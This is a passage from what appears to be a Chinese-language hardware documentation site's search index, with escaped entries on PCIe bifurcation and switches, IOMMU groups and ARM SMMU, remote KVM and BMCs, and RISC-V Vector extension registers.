\u200b\u901a\u8fc7\u200b PCIe \u200b\u914d\u7f6e\u200b\u7a7a\u95f4\u200b\u6765\u200b\u914d\u7f6e\u200b\u3002\u200b\u8bbe\u5907\u200b\u4e00\u4fa7\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7531\u200b\u4e3b\u677f\u200b\u8fdb\u884c\u200b\u62c6\u5206\u200b\uff0c\u200b\u6b64\u65f6\u200b\u4e3b\u677f\u200b\u4e0a\u4f1a\u200b\u6709\u200b\u591a\u4f59\u200b\u7684\u200b PCIe \u200b\u63a5\u53e3\u200b\uff0c\u200b\u6839\u636e\u200b\u63d2\u200b\u5728\u200b\u4e3b\u677f\u200b\u4e0a\u200b\u7684\u200b\u8bbe\u5907\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4e3b\u677f\u200b\u81ea\u200b\u9002\u5e94\u200b\u51fa\u200b\u4e00\u4e2a\u200b PCIe Bifurcation \u200b\u914d\u7f6e\u200b\uff1b\u200b\u4e3b\u677f\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4ec0\u4e48\u200b\u90fd\u200b\u4e0d\u200b\u505a\u200b\uff0c\u200b\u76f4\u63a5\u200b\u628a\u200b CPU \u200b\u7684\u200b PCIe \u200b\u63a5\u5230\u200b Slot \u200b\u4e0a\u200b\uff0c\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u7528\u6237\u200b\u81ea\u5df1\u200b\u8d2d\u4e70\u200b PCIe \u200b\u62c6\u5206\u200b\u5361\u200b\u3002\u200b\u6dd8\u5b9d\u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u641c\u200b\u5230\u200b\u4e0d\u5c11\u200b PCIe \u200b\u62c6\u5206\u200b\u5361\u200b\uff0c\u200b\u5176\u4e2d\u200b\u7528\u4e8e\u200b NVMe \u200b\u7684\u200b\u8f83\u200b\u591a\u200b\uff0c\u200b\u6bd5\u7adf\u200b M.2 \u200b\u63a5\u53e3\u200b\u9762\u79ef\u200b\u5c0f\u200b\uff0c\u200b\u800c\u4e14\u200b\u53ea\u200b\u9700\u8981\u200b PCIe x4\u3002</p> <p>\u200b\u53e6\u200b\u4e00\u79cd\u200b\u65b9\u6848\u200b\u662f\u200b PCIe \u200b\u4ea4\u6362\u673a\u200b\uff08\u200b\u5982\u200b PEX 8747\uff09\uff0c\u200b\u7f3a\u70b9\u200b\u662f\u200b\u6210\u672c\u200b\u8f83\u200b\u9ad8\u200b\uff0c\u200b\u589e\u52a0\u200b\u4e86\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u597d\u5904\u200b\u662f\u200b\u7075\u6d3b\u6027\u200b\u5f88\u5f3a\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b CPU \u200b\u989d\u5916\u200b\u914d\u7f6e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5916\u63a5\u200b\u66f4\u200b\u591a\u200b\u8bbe\u5907\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8bbe\u5907\u200b\u7a7a\u95f2\u200b\u65f6\u200b\u53ef\u4ee5\u200b\u8ba9\u51fa\u200b\u5e26\u5bbd\u200b\u3002\u200b\u4f8b\u5982\u200b\u4e00\u4e2a\u200b x16 \u200b\u4f7f\u7528\u200b Bifurcation \u200b\u65b9\u6cd5\u200b\u53ef\u4ee5\u200b\u62c6\u6210\u200b\u4e24\u4e2a\u200b x8\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b PCIe \u200b\u4ea4\u6362\u673a\u200b\u8fde\u63a5\u200b\u4e24\u4e2a\u200b x16\uff0c\u200b\u7c7b\u4f3c\u200b\u7f51\u7edc\u200b\uff0c\u200b\u8fd9\u200b\u4e24\u4e2a\u200b x16 \u200b\u5171\u4eab\u200b\u5e26\u5bbd\u200b\uff0c\u200b\u4e0b\u6e38\u200b\u7684\u200b\u4e24\u4e2a\u200b\u8bbe\u5907\u200b\u4e4b\u95f4\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u901a\u4fe1\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5728\u200b HPC \u200b\u573a\u666f\u200b\u4e0b\u4f1a\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4f7f\u7528\u200b PCIe \u200b\u4ea4\u6362\u673a\u200b\u8fde\u63a5\u200b\u663e\u5361\u200b\u548c\u200b IB \u200b\u7f51\u5361\u200b\u3002</p>"},{"location":"hardware/pcie.html#_9","title":"\u63a8\u8350\u200b\u9605\u8bfb","text":"<ul> <li>LogicJitterGibbs \u200b\u8d44\u6599\u200b\u6574\u7406\u200b\uff1a\u200b\u53ef\u4ee5\u200b\u5b66\u4e60\u200b 1W \u200b\u5c0f\u65f6\u200b\u7684\u200b PCIe</li> <li>intel \u200b\u90e8\u5206\u200b\u684c\u9762\u200b\u7ea7\u200b CPU \u200b\u7684\u200b pcie \u200b\u901a\u9053\u200b\u62c6\u5206\u200b\u53e6\u7c7b\u200b\u4f4e\u6210\u672c\u200b\u5b9e\u73b0\u200b</li> <li>Intel Alder Lake 12 \u200b\u4ee3\u9177\u200b\u777f\u200b CPU PCIe \u200b\u62c6\u5206\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b</li> </ul>"},{"location":"hardware/pcie.html#iommu","title":"IOMMU","text":"<p>IOMMU \u200b\u5728\u200b\u786c\u4ef6\u200b\u4e0a\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u5f0f\u200b\u7c7b\u4f3c\u200b CPU \u200b\u4e0a\u200b\u7684\u200b MMU\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u5bf9\u8c61\u200b\u662f\u200b PCIe \u200b\u8bbe\u5907\u200b\uff0c\u200b\u5f53\u200b PCIe \u200b\u8bbe\u5907\u200b\u5728\u200b\u53d1\u8d77\u200b\u5185\u5b58\u200b\u8bfb\u5199\u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u7ecf\u8fc7\u200b IOMMU\uff0cIOMMU \u200b\u6309\u7167\u200b\u9884\u5148\u200b\u914d\u7f6e\u200b\u597d\u200b\u7684\u200b\u8bbe\u5b9a\u200b\u8fdb\u884c\u200b\u5730\u5740\u200b\u8f6c\u6362\u200b\uff0c\u200b\u5982\u679c\u200b\u8f6c\u6362\u200b\u4e0d\u200b\u6210\u529f\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u62d2\u7edd\u8bf7\u6c42\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u5b89\u5168\u6027\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u6709\u4e9b\u200b\u60c5\u51b5\u200b\u4e0b\u200b IOMMU \u200b\u4e0d\u80fd\u200b\u4fdd\u8bc1\u200b\u7ed9\u200b\u6bcf\u4e2a\u200b\u8bbe\u5907\u200b\u90fd\u200b\u5355\u72ec\u200b\u4e00\u4e2a\u200b\u5730\u5740\u200b\u8f6c\u6362\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u4e0d\u80fd\u200b\u4fdd\u8bc1\u200b\u628a\u200b\u6bcf\u4e2a\u200b\u8bbe\u5907\u200b\u7684\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u90fd\u200b\u9694\u79bb\u5f00\u200b\uff0c\u200b\u53ef\u80fd\u200b\u6709\u200b\u82e5\u5e72\u4e2a\u200b\u8bbe\u5907\u200b\u9700\u8981\u200b\u5171\u4eab\u200b\u540c\u4e00\u4e2a\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u6620\u5c04\u200b\u3002\u200b\u6b64\u65f6\u200b\u8fd9\u4e9b\u200b\u5171\u4eab\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u7684\u200b\u8bbe\u5907\u200b\u5c31\u200b\u7ec4\u6210\u200b\u4e00\u4e2a\u200b IOMMU Group\uff0cGroup \u200b\u5185\u200b\u7684\u200b\u8bbe\u5907\u200b\u4e0d\u200b\u9694\u79bb\u200b\uff0cGroup \u200b\u4e4b\u95f4\u200b\u9694\u79bb\u200b\u3002</p> <p>\u200b\u5404\u200b\u5e73\u53f0\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u81ea\u5df1\u200b\u7684\u200b IOMMU \u200b\u6807\u51c6\u200b\uff1a</p> <ul> <li>AMD I/O Virtualization Technology (IOMMU) Specification</li> <li>Intel VT-d</li> <li>ARM SMMU v3</li> </ul> <p>\u200b\u4ee5\u200b ARM SMMU \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5b83\u200b\u5728\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u89c1\u200b\u4e0b\u56fe\u200b\uff1a</p> <p> </p> SMMU\uff08\u200b\u56fe\u6e90\u200b ARM IHI 0070 F.a\uff09 <p>\u200b\u56fe\u4e2d\u200b\u4e0a\u534a\u200b\u90e8\u5206\u200b\u5bf9\u5e94\u200b\u7684\u200b\u662f\u200b\u7247\u200b\u4e0a\u200b\u603b\u7ebf\u200b\uff0c\u200b\u4f8b\u5982\u200b AXI\uff1b\u200b\u4e0b\u200b\u534a\u200b\u90e8\u5206\u200b\u5bf9\u5e94\u200b\u7684\u200b\u662f\u200b PCIe\u3002\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u4ece\u200b\u5904\u7406\u5668\u200b\uff08PE\uff09\u200b\u5230\u200b\u5916\u8bbe\u200b\uff08Device/EP\uff09\u200b\u7684\u200b\u6d41\u91cf\u200b\u662f\u200b\u4e0d\u4f1a\u200b\u7ecf\u8fc7\u200b SMMU \u200b\u7ffb\u8bd1\u200b\u7684\u200b\uff0c\u200b\u800c\u200b\u53ea\u6709\u200b\u5f53\u200b\u5916\u8bbe\u200b\u8981\u200b\u8bbf\u95ee\u200b\u5185\u5b58\u200b\uff08Memory\uff09\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5b83\u4f1a\u200b\u7ecf\u8fc7\u200b SMMU \u200b\u8fdb\u884c\u200b\u5730\u5740\u200b\u8f6c\u6362\u200b\uff0c\u200b\u7528\u200b\u8f6c\u6362\u200b\u540e\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\u8bbf\u95ee\u200b\u5185\u5b58\u200b\u3002</p>"},{"location":"hardware/remote_kvm.html","title":"\u8fdc\u7a0b\u200b KVM","text":"<p>\u200b\u8fdc\u7a0b\u200b KVM \u200b\u662f\u200b\u6307\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u7f51\u7edc\u200b\u8fdc\u7a0b\u200b\u5730\u200b\u63a7\u5236\u200b\u673a\u5668\u200b\uff0c\u200b\u5305\u62ec\u200b\u952e\u76d8\u200b\uff08Keyboard\uff09\u3001\u200b\u89c6\u9891\u200b\uff08Video\uff09\u200b\u548c\u200b\u9f20\u6807\u200b\uff08Mouse\uff09\uff0c\u200b\u4e09\u4e2a\u200b\u5355\u8bcd\u200b\u7684\u200b\u9996\u5b57\u6bcd\u200b\u8fde\u200b\u8d77\u6765\u200b\u5c31\u662f\u200b KVM\u3002\u200b\u6b64\u5916\u200b\uff0c\u200b\u5b83\u200b\u8fd8\u200b\u901a\u5e38\u200b\u652f\u6301\u200b\u8fdc\u7a0b\u200b\u5f00\u5173\u673a\u200b\u3001\u200b\u6302\u8f7d\u200b\u865a\u62df\u200b\u78c1\u76d8\u200b\u7b49\u200b\u529f\u80fd\u200b\u3002\u200b\u5b83\u200b\u89e3\u51b3\u200b\u4e86\u200b\u8fdc\u7a0b\u200b\u673a\u5668\u200b\u8fd0\u7ef4\u200b\u7684\u200b\u95ee\u9898\u200b\u3002\u200b\u5728\u200b\u6ca1\u6709\u200b\u8fdc\u7a0b\u200b KVM \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u5bf9\u200b\u673a\u5668\u200b\u8fdb\u884c\u200b\u8fd0\u7ef4\u200b\uff0c\u200b\u901a\u5e38\u200b\u9700\u8981\u200b\uff1a</p> <ol> <li>\u200b\u7ef4\u62a4\u200b\u4eba\u5458\u200b\u7ebf\u4e0b\u200b\u63a5\u89e6\u200b\u5230\u200b\u673a\u5668\u200b</li> <li>\u200b\u628a\u200b\u673a\u5668\u200b\u8fde\u63a5\u200b\u5230\u200b\u952e\u76d8\u200b\u3001\u200b\u9f20\u6807\u200b\u548c\u200b\u663e\u793a\u5668\u200b</li> </ol> <pre><code>+----------+\n| Machine  |\n+----------+\n  |  |  |\n  |  |  \\--USB--Keyboard\n  |  |\n  |  \\------USB--Mouse\n  |\n  \\---------HDMI-Monitor\n</code></pre> <p>\u200b\u5982\u679c\u200b\u673a\u5668\u200b\u5f88\u591a\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u51cf\u5c11\u200b\u6765\u56de\u200b\u7684\u200b\u63d2\u62d4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b\u786c\u4ef6\u200b\u7684\u200b KVM \u200b\u5207\u6362\u5668\u200b\uff1a\u200b\u5b83\u200b\u652f\u6301\u200b\u591a\u8def\u200b\u8f93\u5165\u200b\u548c\u200b\u4e00\u8def\u200b\u8f93\u51fa\u200b\uff0c\u200b\u6bcf\u200b\u4e00\u8def\u200b\u7684\u200b\u8f93\u5165\u200b\u6216\u200b\u8f93\u51fa\u200b\uff0c\u200b\u901a\u5e38\u200b\u90fd\u200b\u5305\u62ec\u200b\u89c6\u9891\u200b\uff08Video\uff0c\u200b\u4f8b\u5982\u200b HDMI \u200b\u6216\u200b VGA \u200b\u63a5\u53e3\u200b\uff09\u200b\u548c\u200b USB\uff08\u200b\u7528\u4e8e\u200b Keyboard \u200b\u548c\u200b Mouse\uff09\u3002KVM \u200b\u5207\u6362\u5668\u200b\u901a\u5e38\u200b\u6709\u200b\u6309\u94ae\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u591a\u8def\u200b\u8f93\u5165\u200b\u4e2d\u200b\u5207\u6362\u200b\u3002</p> <pre><code>  HDMI Input 1\n  | USB Input 1\n  | | HDMI Input 2\n  | | | USB Input 2\n  | | | | HDMI Input 3\n  | | | | | USB Input 3\n  | | | | | |\n  | | | | | |\n+-------------+\n| KVM Switch  |\n+-------------+\n  | | |\n  | | USB Output (for Mouse)\n  | USB Output (for Keyboard)\n  HDMI Output\n</code></pre> <p>\u200b\u4f8b\u5982\u200b\uff0c\u200b\u6709\u200b\u4e09\u53f0\u200b\u673a\u5668\u200b\u7ecf\u5e38\u200b\u9700\u8981\u200b\u8fd0\u7ef4\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u6765\u56de\u200b\u7684\u200b\u63d2\u62d4\u200b\uff0c\u200b\u8d2d\u4e70\u200b\u4e00\u4e2a\u200b\u4e09\u200b\u8f93\u5165\u200b\u7684\u200b KVM \u200b\u5207\u6362\u5668\u200b\uff0c\u200b\u628a\u200b\u4e09\u53f0\u200b\u673a\u5668\u200b\u7684\u200b HDMI \u200b\u548c\u200b USB \u200b\u5206\u522b\u200b\u63a5\u5230\u200b KVM \u200b\u5207\u6362\u5668\u200b\u7684\u200b\u4e09\u8def\u200b\u8f93\u5165\u200b\uff0c\u200b\u518d\u200b\u628a\u200b KVM \u200b\u5207\u6362\u5668\u200b\u7684\u200b\u8f93\u51fa\u200b\u8fde\u63a5\u200b\u5230\u200b\u663e\u793a\u5668\u200b\u4e0a\u200b\uff0c\u200b\u518d\u200b\u628a\u200b USB \u200b\u952e\u76d8\u200b\u548c\u200b\u9f20\u6807\u200b\u63d2\u200b\u5230\u200b KVM \u200b\u5207\u6362\u5668\u200b\u7684\u200b\u8f93\u51fa\u200b\u7aef\u200b\u3002\u200b\u6b64\u65f6\u200b\uff0c\u200b\u901a\u8fc7\u200b KVM \u200b\u5207\u6362\u5668\u200b\u7684\u200b\u6309\u94ae\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5207\u6362\u200b\u5230\u200b\u5177\u4f53\u200b\u7684\u200b\u67d0\u200b\u4e00\u53f0\u200b\u673a\u5668\u200b\uff1a\u200b\u5982\u679c\u200b\u5207\u6362\u200b\u5230\u200b\u7b2c\u4e00\u53f0\u200b\u673a\u5668\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u76f8\u5f53\u4e8e\u200b\u628a\u200b\u7b2c\u4e00\u53f0\u200b\u673a\u5668\u200b\u7684\u200b HDMI \u200b\u8f93\u51fa\u200b\u63a5\u5230\u200b\u663e\u793a\u5668\u200b\u4e0a\u200b\uff0c\u200b\u540c\u65f6\u200b\u628a\u200b USB \u200b\u952e\u76d8\u200b\u548c\u200b\u9f20\u6807\u200b\u63a5\u5230\u200b\u7b2c\u4e00\u53f0\u200b\u673a\u5668\u200b\u4e0a\u200b\u3002\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b\u8981\u200b\u5bf9\u200b\u7b2c\u4e8c\u53f0\u200b\u673a\u5668\u200b\u8fdb\u884c\u200b\u8fd0\u7ef4\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u901a\u8fc7\u200b KVM \u200b\u5207\u6362\u5668\u200b\u7684\u200b\u6309\u94ae\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5b8c\u6210\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u63d2\u62d4\u200b HDMI \u200b\u6216\u8005\u200b USB \u200b\u7ebf\u200b\u3002</p> <pre><code>+------------+   +------------+   +------------+\n| Machine  1 |   | Machine 2  |   | Machine 3  |\n+------------+   +------------+   +------------+\n  |       |        |       |        |       |\n  | HDMI  | USB    | HDMI  | USB    | HDMI  | USB\n  |  #1   |  #1    |  #2   |  #2    |  #3   |  #3\n+-----------------------------------------------+\n| KVM Switch                           [Button] |\n+-----------------------------------------------+\n  | | |\n  | | \\--USB--Mouse\n  | \\----USB--Keyboard\n  \\------HDMI-Monitor\n</code></pre> <p>KVM \u200b\u5207\u6362\u5668\u200b\u867d\u7136\u200b\u89e3\u51b3\u200b\u4e86\u200b\u63d2\u62d4\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f46\u200b\u7ef4\u62a4\u200b\u4eba\u5458\u200b\u8fd8\u662f\u200b\u9700\u8981\u200b\u5230\u200b\u673a\u5668\u200b\u6240\u5728\u200b\u7684\u200b\u5730\u65b9\u200b\uff0c\u200b\u4e0d\u80fd\u200b\u8fdc\u7a0b\u200b\u64cd\u4f5c\u200b\u3002\u200b\u800c\u200b\u8fdc\u7a0b\u200b KVM \u200b\u89e3\u51b3\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff1a</p> <pre><code>+------------+\n| Machine 1  |\n+------------+\n  |       |\n  | HDMI  | USB\n  |  #1   |  #1\n+------------+\n| Remote KVM |\n+------------+\n  |\n  | Network\n  |\n+------------+\n| Operator   |\n+------------+\n</code></pre> <p>\u200b\u8fd0\u7ef4\u200b\u4eba\u5458\u200b\u901a\u8fc7\u200b\u7f51\u7edc\u200b\u8bbf\u95ee\u200b\u8fdc\u7a0b\u200b KVM\uff0c\u200b\u800c\u200b\u8fdc\u7a0b\u200b KVM \u200b\u901a\u8fc7\u200b HDMI \u200b\u548c\u200b USB \u200b\u8fde\u63a5\u200b\u5230\u200b\u673a\u5668\u200b\u4e0a\u200b\u3002\u200b\u4e3a\u4e86\u200b\u8ba9\u200b\u8fd0\u7ef4\u200b\u4eba\u5458\u200b\u53ef\u4ee5\u200b\u8fdc\u7a0b\u200b\u64cd\u63a7\u200b\u673a\u5668\u200b\uff0c\u200b\u8fdc\u7a0b\u200b KVM \u200b\u901a\u5e38\u200b\u4f1a\u200b\u63d0\u4f9b\u200b\u4e00\u4e2a\u200b\u7f51\u9875\u200b\uff0c\u200b\u5728\u200b\u7f51\u9875\u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u89c2\u770b\u200b\u673a\u5668\u200b\u7684\u200b HDMI \u200b\u663e\u793a\u200b\u8f93\u51fa\u200b\uff0c\u200b\u8fd0\u7ef4\u200b\u4eba\u5458\u200b\u901a\u8fc7\u200b\u7f51\u9875\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u64cd\u4f5c\u200b\u9f20\u6807\u200b\uff0c\u200b\u952e\u76d8\u200b\u6309\u952e\u200b\u4e5f\u200b\u4f1a\u200b\u88ab\u200b\u4f20\u8f93\u200b\u5230\u200b\u673a\u5668\u200b\u4e0a\u200b\u3002\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\uff0c\u200b\u8fdc\u7a0b\u200b KVM \u200b\u5185\u7f6e\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u91c7\u96c6\u200b\u82af\u7247\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u628a\u200b HDMI \u200b\u7684\u200b\u8f93\u51fa\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u6570\u5b57\u4fe1\u53f7\u200b\uff0c\u200b\u901a\u8fc7\u200b\u89c6\u9891\u200b\u7f16\u7801\u200b\uff0c\u200b\u4ee5\u200b\u89c6\u9891\u6d41\u200b\u7684\u200b\u65b9\u5f0f\u200b\u4f20\u8f93\u200b\u5230\u200b\u8fd0\u7ef4\u200b\u4eba\u5458\u200b\u64cd\u4f5c\u200b\u7684\u200b\u6d4f\u89c8\u5668\u200b\u91cc\u200b\uff1b\u200b\u540c\u65f6\u200b\u8fdc\u7a0b\u200b KVM \u200b\u53ef\u4ee5\u200b\u6a21\u62df\u200b USB \u200b\u8bbe\u5907\u200b\uff1a\u200b\u9f20\u6807\u200b\u3001\u200b\u952e\u76d8\u200b\u548c\u200b U \u200b\u76d8\u200b\u7b49\u200b\uff0c\u200b\u4ece\u800c\u200b\u5b9e\u73b0\u200b\u8fdc\u7a0b\u200b\u7684\u200b\u9f20\u6807\u200b\u952e\u76d8\u200b\u64cd\u63a7\u200b\u548c\u200b\u865a\u62df\u200b\u955c\u50cf\u200b\u7684\u200b\u6302\u8f7d\u200b\u3002</p> <p>\u200b\u5728\u200b\u5f88\u591a\u200b\u670d\u52a1\u5668\u200b\u4e2d\u200b\uff0cBMC\uff08Board Management Controller\uff09\u200b\u5185\u7f6e\u200b\u4e86\u200b\u8fdc\u7a0b\u200b KVM \u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u5b83\u200b\u548c\u200b\u673a\u5668\u200b\u7684\u200b\u96c6\u6210\u200b\u7a0b\u5ea6\u200b\u66f4\u6df1\u200b\uff1a\u200b\u5b83\u200b\u901a\u5e38\u200b\u662f\u200b\u901a\u8fc7\u200b PCIe \u200b\u7684\u200b\u65b9\u5f0f\u200b\u8fde\u63a5\u200b\u670d\u52a1\u5668\u200b\u7684\u200b CPU\uff0c\u200b\u901a\u8fc7\u200b PCIe \u200b\u865a\u62df\u200b\u51fa\u200b\u663e\u5361\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u663e\u5361\u200b\u7684\u200b\u8f93\u51fa\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u88ab\u200b BMC \u200b\u91c7\u96c6\u200b\u5230\u200b\uff0c\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u7684\u200b\u91c7\u96c6\u200b\u82af\u7247\u200b\u3002\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b BMC\uff0c\u200b\u5219\u200b\u53ef\u4ee5\u200b\u8d2d\u4e70\u200b\u4e00\u4e9b\u200b\u8fdc\u7a0b\u200b KVM \u200b\u7684\u200b\u6269\u5c55\u5361\u200b\uff0c\u200b\u6765\u200b\u63d0\u4f9b\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li>PiKVM</li> <li>NanoKVM</li> <li>BliKVM</li> </ul>"},{"location":"hardware/rvv.html","title":"RISC-V Vector (RVV) Extension","text":"<p>\u200b\u89c4\u8303\u200b\uff1ariscvarchive/riscv-v-spec</p> <p>PPT\uff1a</p> <ul> <li>RISC-V Vector Extension Webinar I</li> <li>RISC-V Vector Extension Webinar II</li> <li>RISC-V Vector Extension Webinar III</li> </ul>"},{"location":"hardware/rvv.html#_1","title":"\u6982\u5ff5","text":"<ul> <li>VLEN: \u200b\u6bcf\u4e2a\u200b\u5411\u91cf\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u5bbd\u5ea6\u200b\uff0c\u200b\u5355\u4f4d\u200b\u662f\u200b bit</li> <li>SEW(Selected Element Width): \u200b\u5f53\u524d\u200b\u7684\u200b\u5143\u7d20\u200b\u5bbd\u5ea6\u200b\uff0c\u200b\u5355\u4f4d\u200b\u662f\u200b bit\uff0c\u200b\u53d6\u503c\u200b 8/16/32/64</li> <li>ELEN: \u200b\u652f\u6301\u200b\u7684\u200b SEW \u200b\u7684\u200b\u6700\u5927\u503c\u200b</li> <li>LMUL: Vector register group multiplier\uff0c\u200b\u628a\u200b\u4e00\u5230\u200b\u591a\u4e2a\u200b\u7684\u200b\u5411\u91cf\u200b\u5bc4\u5b58\u5668\u200b\u7ed1\u200b\u5728\u200b\u4e00\u8d77\u200b\u5f53\u6210\u200b\u4e00\u4e2a\u200b\u5411\u91cf\u200b\u5bc4\u5b58\u5668\u200b\u6765\u200b\u7528\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u662f\u200b\u6574\u6570\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u662f\u200b\u5206\u6570\u200b\uff0c\u200b\u53d6\u503c\u200b 1/8, 1/4, 1/2, 1, 2, 4, 8</li> <li>VLMAX: \u200b\u6700\u5927\u200b\u7684\u200b\u5143\u7d20\u200b\u4e2a\u6570\u200b\uff1a<code>LMUL*VLEN/SEW</code></li> <li>EEW: effective element width\uff0c\u200b\u9ed8\u8ba4\u200b\u662f\u200b SEW\uff0c\u200b\u4f46\u200b\u5982\u679c\u200b\u6307\u4ee4\u200b\u81ea\u5e26\u200b\u4e86\u200b\u5bbd\u5ea6\u200b\uff0cEEW \u200b\u53ef\u80fd\u200b\u548c\u200b SEW \u200b\u4e0d\u540c\u200b</li> <li>EMUL: effective LMUL\uff0c\u200b\u9ed8\u8ba4\u200b\u662f\u200b LMUL\uff0c\u200b\u4f46\u200b\u5982\u679c\u200b EEW \u200b\u548c\u200b SEW \u200b\u4e0d\u540c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b EEW/EMUL=SEW/LMUL \u200b\u5f97\u5230\u200b EMUL \u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u8fd9\u6837\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u5143\u7d20\u200b\u4e2a\u6570\u200b\u662f\u200b\u4e0d\u53d8\u200b\u7684\u200b</li> <li>Mask: v0 \u200b\u4f5c\u4e3a\u200b\u53ef\u9009\u200b\u7684\u200b mask \u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u6bcf\u4e2a\u200b bit \u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b element</li> </ul>"},{"location":"hardware/rvv.html#csr","title":"CSR","text":"<ul> <li>mstatus/vsstatus: \u200b\u548c\u200b\u6d6e\u70b9\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u7528\u6765\u200b\u542f\u7528\u200b/\u200b\u5173\u95ed\u200b RVV\uff0c\u200b\u65b9\u4fbf\u200b\u4e0a\u4e0b\u6587\u200b\u5207\u6362\u200b</li> <li>vtype: \u200b\u6700\u200b\u4e3b\u8981\u200b\u7684\u200b rvv \u200b\u72b6\u6001\u200b\uff0c\u200b\u901a\u8fc7\u200b <code>vset{i}vl{i}</code> \u200b\u6307\u4ee4\u200b\u8bbe\u7f6e\u200b\uff0c\u200b\u5305\u62ec\u200b\u5982\u4e0b\u200b\u5b57\u200b\u6bb5\u200b\uff1a<ul> <li>vill: illegal\uff0c\u200b\u7528\u6765\u200b\u68c0\u6d4b\u200b\u4e0d\u200b\u5408\u6cd5\u200b\u7684\u200b vtype</li> <li>vma: \u200b\u8bbe\u7f6e\u200b\u6ca1\u6709\u200b\u88ab\u200b mask enable \u200b\u7684\u200b\u90e8\u5206\u200b\u600e\u4e48\u200b\u5904\u7406\u200b\uff1aundisturbed\uff08\u200b\u4e0d\u53d8\u200b\uff09\u200b\u6216\u200b agnostic\uff08\u200b\u786c\u4ef6\u200b\u51b3\u5b9a\u200b\u4e0d\u53d8\u200b\u6216\u8005\u200b\u5199\u200b\u4e3a\u200b\u5168\u200b 1\uff09</li> <li>vta\uff1a\u200b\u8bbe\u7f6e\u200b\u6ca1\u6709\u200b\u88ab\u200b vl \u200b\u8986\u76d6\u200b\u7684\u200b\u90e8\u5206\u200b\u600e\u4e48\u200b\u5904\u7406\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b undisturbed \u200b\u6216\u200b agnostic</li> <li>vsew\uff1a\u200b\u8bbe\u7f6e\u200b SEW</li> <li>vlmul\uff1a\u200b\u8bbe\u7f6e\u200b LMUL</li> </ul> </li> <li>vl: \u200b\u5f53\u524d\u200b\u7684\u200b\u5411\u91cf\u200b\u5bc4\u5b58\u5668\u200b\u957f\u5ea6\u200b\uff0c\u200b\u901a\u8fc7\u200b <code>vset{i}vl{i}</code> 